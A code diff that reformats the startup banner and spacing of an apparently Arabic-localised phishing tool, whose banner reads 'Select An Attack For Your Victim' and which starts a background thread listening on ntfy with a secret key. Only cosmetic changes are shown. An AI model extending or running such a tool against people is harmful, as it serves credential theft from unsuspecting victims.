@@ -56,21 +56,25 @@ def fmt_entry(num, name):
     return colored + " " * padding
 
 def print_banner():
-    # دمج كل شيء في نص واحد بدون أسطر فارغة زائدة
     banner = f"""{ORANGE}
    ______              __  ____  __    _     __
   / ____/__  ____  ____/ /_/ __ \/ /_  (_)___/ /_
  / / __/ _ \/ __ \/ ___/ __/ /_/ / __ \/ / __/ __/
 / /_/ /  __/ /_/ (__  ) /_/ ____/ / / / (__  ) / / /
 \____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
-{RESET}
-{WHITE}General : 1.0{RESET}
-{WHITE}[–] Tool Created by htr-tech (tahmid.rayat){RESET}
-{WHITE}[::] Select An Attack For Your Victim [::]{RESET}
-{ORANGE}غافل الغرباء{RESET}"""
+{RESET}"""
     print(banner)
+    # أسطر فارغة بين الأقسام العلوية (حسب طلبك)
+    print()
+    print(WHITE + "General : 1.0" + RESET)
+    print(WHITE + "[–] Tool Created by htr-tech (tahmid.rayat)" + RESET)
+    print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
+    print()
+    print(ORANGE + "الشبح" + RESET)
+    print()
 
 def print_menu():
+    # قائمة المنصات: أسطر متلاصقة بدون أي سطر فارغ بينها (مسافة عمودية ضيقة جداً)
     for i in range(1, 11):
         col1 = fmt_entry(i, PLATFORMS[i])
         col2 = fmt_entry(i + 10, PLATFORMS[i + 10])
@@ -120,8 +124,8 @@ def main():
     secret = load_or_create_secret()
     clear_screen()
     print_banner()
-    # المفتاح السري ملتصق تماماً بالسطر السابق بدون أي مسافة عمودية
     print(f"{WHITE}🔑 مفتاحك السري: {ORANGE}{secret}{RESET}")
+    print()  # سطر فارغ قبل القائمة (مسافة بين المفتاح والقائمة)
     threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
     time.sleep(1)
 
